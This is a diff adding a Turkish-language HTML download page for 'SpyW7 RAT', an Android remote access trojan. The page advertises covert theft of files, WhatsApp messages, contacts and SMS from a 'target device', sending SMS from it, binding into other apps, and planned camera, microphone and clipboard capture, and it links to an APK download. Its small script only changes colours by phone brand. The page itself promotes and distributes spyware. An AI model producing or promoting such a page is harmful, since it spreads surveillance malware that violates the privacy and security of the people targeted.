@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uygulama İndirme</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+
+        .container {
+            margin-top: 50px;
+        }
+
+        .logo {
+            width: 150px;
+            height: 150px;
+            background-color: #111;
+            border: 3px solid red; /* Varsayılan kırmızı */
+            box-shadow: 0 0 20px red;
+            margin: 0 auto;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .app-title {
+            font-size: 24px;
+            margin-top: 20px;
+        }
+
+        .app-description {
+            font-size: 18px;
+            margin-top: 10px;
+        }
+
+        .download-btn {
+            display: inline-block;
+            margin-top: 30px;
+            padding: 15px 30px;
+            font-size: 20px;
+            color: white;
+            text-decoration: none;
+            border: 3px solid red; /* Varsayılan kırmızı */
+            box-shadow: 0 0 20px red;
+            border-radius: 10px;
+            transition: 0.3s;
+        }
+
+        .download-btn:hover {
+            background-color: red;
+            box-shadow: 0 0 30px red;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="logo.png" alt="Uygulama Logosu">
+        </div>
+        <h1 class="app-title">SpyW7 RAT Sihirbazı</h1>
+       
+        <p>✅ Gerçek zamanlı</p>
+<p>✅ Hedef cihazdan herhangi bir dosya veya klasör al</p>
+<p>✅ Diğer uygulamalarla birleştir (bind)</p>
+<p>✅ Tüm WhatsApp mesajlarını al</p>
+<p>✅ Tüm WhatsApp kişilerini al</p>
+<p>✅ Hedef cihazdaki tüm mesajları al</p>
+<p>✅ Hedef cihazdan herhangi bir numaraya SMS gönder</p>
+<p>✅ Hedef cihazdaki tüm kişileri al</p>
+<p>✅ Hedef cihazda yüklü tüm uygulamaların listesini al</p>
+
+<p>⏳ Hedef cihazdan herhangi bir dosya veya klasörü sil</p>
+<p>⏳ Ön ve arka kameradan görüntü al</p>
+<p>⏳ Mikrofon kaydı yap</p>
+<p>⏳ Son kopyalanan metni al</p>
+        <a href="https://swfs.alertingweb.com/spyw7.apk" class="download-btn">İndir</a>
+    </div>
+
+    <script>
+        // Kullanıcının cihaz bilgilerini al
+        let userAgent = navigator.userAgent.toLowerCase();
+        let borderColor = "red"; // Varsayılan kırmızı
+
+        // Telefon modellerine göre çerçeve rengini ayarla
+        if (userAgent.includes("samsung")) {
+            borderColor = "blue"; // Samsung cihazlarda mavi
+        } else if (userAgent.includes("iphone")) {
+            borderColor = "gold"; // iPhone cihazlarda altın sarısı
+        } else if (userAgent.includes("xiaomi") || userAgent.includes("redmi") || userAgent.includes("mi")) {
+            borderColor = "orange"; // Xiaomi cihazlarda turuncu
+        } else if (userAgent.includes("huawei")) {
+            borderColor = "green"; // Huawei cihazlarda yeşil
+        } else if (userAgent.includes("oneplus")) {
+            borderColor = "purple"; // OnePlus cihazlarda mor
+        }
+
+        // Seçilen renge göre CSS güncelle
+        document.querySelector(".logo").style.borderColor = borderColor;
+        document.querySelector(".logo").style.boxShadow = `0 0 20px ${borderColor}`;
+        document.querySelector(".download-btn").style.borderColor = borderColor;
+        document.querySelector(".download-btn").style.boxShadow = `0 0 20px ${borderColor}`;
+    </script>
+
+</body>
+</html>
